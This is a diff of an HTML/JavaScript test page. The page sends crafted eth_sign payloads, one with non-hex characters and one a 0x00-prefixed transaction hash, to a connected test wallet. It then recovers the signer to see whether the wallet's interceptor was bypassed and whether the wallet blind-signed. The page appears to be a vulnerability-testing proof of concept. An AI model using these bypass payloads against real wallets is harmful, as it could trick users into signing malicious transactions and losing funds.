@@ -2,36 +2,29 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>非 Hex 字符解析器绕过与底层真伪鉴定</title>
+    <title>0x00 解析器差异与签名真伪鉴定</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
     <style>
-        body { font-family: monospace; max-width: 900px; margin: 20px auto; padding: 25px; background-color: #f8f9fa; color: #333; }
-        h2 { color: #212529; border-bottom: 2px solid #dee2e6; padding-bottom: 10px; }
-        button { padding: 12px 24px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #0d6efd; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 15px;}
-        button.exploit { background-color: #dc3545; }
-        button:disabled { background-color: #adb5bd; cursor: not-allowed; }
-        #console { background: #212529; color: #20c997; padding: 20px; border-radius: 8px; height: 450px; overflow-y: auto; white-space: pre-wrap; font-size: 14px; border: 1px solid #495057; line-height: 1.6;}
-        .highlight { color: #ffc107; font-weight: bold; }
-        .danger-text { color: #ff4d4d; font-weight: bold; }
-        .safe-text { color: #0dcaf0; font-weight: bold; }
+        body { font-family: monospace; max-width: 800px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; color: #333; }
+        button { padding: 12px 20px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; }
+        button.danger { background-color: #dc3545; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 2px solid #333; line-height: 1.5; }
     </style>
 </head>
 <body>
-    <h2>非法字符绕过与底层行为全自动鉴定</h2>
-    <div style="margin-bottom: 20px; font-size: 14px; color: #6c757d;">
-        <b>核心逻辑：</b> 采用已验证可击穿防火墙的非 Hex 字符串唤起 UI，随后进行底层密码学解析。
-    </div>
-
+    <h2>0x00 伪装与底层真伪鉴定器</h2>
+    
     <div>
         <button id="btnConnect">1. 连接测试钱包</button>
-        当前地址: <span id="walletAddress" style="font-weight: bold; color: #0d6efd;">未连接</span>
+        当前地址: <span id="walletAddress" style="color: #007bff; font-weight: bold;">未连接</span>
     </div>
 
-    <div style="margin-top: 20px; padding-top: 20px; border-top: 1px dashed #ced4da;">
-        <button id="btnBypass" class="exploit" disabled>2. 发送绕过 Payload 并鉴定真伪</button>
+    <div style="margin-top: 15px; border-top: 1px dashed #ccc; padding-top: 15px;">
+        <button id="btnBypass" class="danger" disabled>2. 发送 0x00 伪装哈希并鉴定</button>
     </div>
 
-    <h3 style="margin-top: 30px; color: #495057;">深度逆向验证控制台:</h3>
+    <h3 style="margin-top: 20px;">渗透与鉴定日志:</h3>
     <div id="console">等待操作...</div>
 
     <script>
@@ -61,11 +54,15 @@
         btnBypass.addEventListener('click', async () => {
             if (!currentAccount) return;
             
-            // 核心：复刻你成功绕过的那条 Payload（包含非十六进制字母）
-            const bypassPayload = "0x11223344Some_evil_content"; 
+            // 真实的恶意交易哈希 (不带 0x)
+            const realTxHash = "89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150a0";
             
-            log(`\n<span class="highlight">--- 🚀 阶段 1：利用非 Hex 字符击穿防火墙 ---</span>`);
-            log(`发送畸形数据: ${bypassPayload}`);
+            // 伪装构造：在前面加上 0x00。
+            // 拦截器看到 0x00 可能以为是空数据，但底层解析器可能会跳过 00 直接读取后面的真实哈希。
+            const bypassPayload = "0x00" + realTxHash; 
+            
+            log(`\n--- 🚀 发送带有 0x00 伪装的 Payload ---`);
+            log(`Payload: ${bypassPayload}`);
             
             try {
                 const signature = await window.ethereum.request({
@@ -73,61 +70,54 @@
                     params: [currentAccount, bypassPayload]
                 });
                 
-                log(`\n<span class="danger-text">🚨 [突破防线] 钱包未能拦截！成功拿到签名:</span>\n${signature}`);
-                log(`\n<span class="highlight">--- 🔍 阶段 2：执行底层签名真伪密码学反推 ---</span>`);
+                log(`🚨 [绕过成功] 成功骗过拦截器，拿到签名:\n${signature}`);
+                log(`\n🔍 开始拆解签名，验证底层逻辑...`);
                 
-                verifyDeepLogic(bypassPayload, signature, currentAccount.toLowerCase());
+                verifySignature(bypassPayload, "0x" + realTxHash, signature, currentAccount.toLowerCase());
 
             } catch (error) {
                 log(`🛡️ 请求被拦截: ${error.message}`);
             }
         });
 
-        // 核心验证引擎
-        function verifyDeepLogic(payload, signature, addressLowerCase) {
+        function verifySignature(payload, realHash, signature, address) {
             if (typeof ethers === 'undefined') return;
-            let foundMatch = false;
+            let resolved = false;
 
-            // 验证 1：安全的伪装 (将包含字母的数据视为纯文本，并加上 EIP-191 前缀)
+            // 验证 1：是否对真实的交易哈希进行了盲签？(致命漏洞)
             try {
-                if (ethers.verifyMessage(payload, signature).toLowerCase() === addressLowerCase) {
-                    log(`\n<span class="safe-text">🛡️ [安全伪装] 鉴定结果：已被安全转换为 personal_sign。</span>`);
-                    log(`原理解析：外层防火墙被字母骗过，但底层库把它当成了普通文本，老老实实加上了 \\x19Ethereum... 前缀。该签名无法用作恶意交易。`);
-                    foundMatch = true;
+                if (ethers.recoverAddress(realHash, signature).toLowerCase() === address) {
+                    log(`\n💥 [致命漏洞！] 鉴定结果：底层剥离了 0x00，对【真实的交易哈希】进行了裸签！`);
+                    log(`结论：这是真正的 eth_sign！钱包不仅被绕过了前端拦截，还主动配合执行了危险的盲签。`);
+                    resolved = true;
                 }
             } catch(e) {}
 
-            // 验证 2：中危裸签 (直接将包含字母的数据转成 UTF-8 字节并 Keccak256 哈希后盲签)
-            if (!foundMatch) {
+            // 验证 2：是否对带着 0x00 的全量数据进行了盲签？(也是高危漏洞)
+            if (!resolved) {
                 try {
-                    const utf8Bytes = ethers.toUtf8Bytes(payload);
-                    const hash = ethers.keccak256(utf8Bytes);
-                    if (ethers.recoverAddress(hash, signature).toLowerCase() === addressLowerCase) {
-                        log(`\n<span class="highlight">⚠️ [中危漏洞] 鉴定结果：文本转码裸签！</span>`);
-                        log(`原理解析：钱包底层将这串字符强行转换成了字节序列并哈希裸签。虽然是 eth_sign，但攻击者极难通过这种带字母的格式拼凑出合法的以太坊交易。`);
-                        foundMatch = true;
+                    if (ethers.recoverAddress(payload, signature).toLowerCase() === address) {
+                        log(`\n⚠️ [高危漏洞！] 鉴定结果：底层对包含 0x00 的畸形数据进行了裸签。`);
+                        log(`结论：这是真正的 eth_sign！虽然没有剥离 0x00，但依然没有进行安全前缀保护。`);
+                        resolved = true;
                     }
                 } catch(e) {}
             }
 
-            // 验证 3：极度致命的剔除裸签 (过滤掉所有非 Hex 字符后，对剩下的字符裸签)
-            if (!foundMatch) {
+            // 验证 3：是否转换为了 personal_sign？(安全防御)
+            if (!resolved) {
                 try {
-                    // 从 "0x11223344Some_evil_content" 提取合法的 hex 字符: 0x11223344eece
-                    const strippedHex = "0x11223344eece";
-                    const hash = ethers.keccak256(strippedHex); // 或直接 zeroPad 到 32 bytes
-                    
-                    if (ethers.recoverAddress(hash, signature).toLowerCase() === addressLowerCase || 
-                        ethers.recoverAddress(ethers.zeroPadValue(strippedHex, 32), signature).toLowerCase() === addressLowerCase) {
-                        log(`\n<span class="danger-text">☠️ [极度致命] 鉴定结果：底层剔除了非法字符并执行了裸签！</span>`);
-                        log(`原理解析：外层防火墙被字母骗过，而底层库自作聪明地删掉了字母，只对剩下的 Hex 进行了盲签！这意味着攻击者可以随意构造恶意交易，只需在里面掺杂字母就能完美击杀。`);
-                        foundMatch = true;
+                    const bytes = ethers.getBytes(payload);
+                    if (ethers.verifyMessage(bytes, signature).toLowerCase() === address) {
+                        log(`\n🛡️ [安全防御] 鉴定结果：已被转换为 personal_sign。`);
+                        log(`结论：虽然 0x00 骗过了拦截器唤起了 UI，但底层依然加上了 EIP-191 前缀。该签名无法作为恶意交易广播。`);
+                        resolved = true;
                     }
                 } catch(e) {}
             }
 
-            if (!foundMatch) {
-                log(`\n❓ [诡异逻辑] 依然无法反推出底层的加密处理逻辑。底层的 C++/Rust 库可能对这段畸形数据发生了意料之外的内存截断。`);
+            if (!resolved) {
+                log(`\n❓ [未知逻辑] 无法解析。底层使用了特殊的截断或填充规则。`);
             }
         }
     </script>
